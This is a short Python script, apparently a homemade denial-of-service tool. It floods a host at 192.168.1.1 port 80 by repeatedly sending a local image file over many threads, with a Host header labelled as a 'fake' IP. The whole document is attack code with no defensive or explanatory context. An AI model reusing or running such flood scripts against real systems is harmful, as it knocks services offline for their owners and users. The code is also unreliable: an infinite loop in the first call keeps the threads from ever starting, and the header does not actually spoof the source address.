import socket, threading

iptarget = "192.168.1.1"
port = 80
fake_ip = "2.36.78.45"

def attack():
    s0cket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s0cket.connect((iptarget, port))
    s0cket.send(("GET /" + iptarget + " HTTP/1.1\r\n").encode('ascii'))
    s0cket.send(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'))
    file = open("C:/Users/hp 650 G3/Desktop/img.jpg", 'rb')
    while True:
        s0cket.sendfile(file)
    s0cket.close()

attack()

for i in range(500):
    thread = threading.Thread(target = attack)
    thread.start()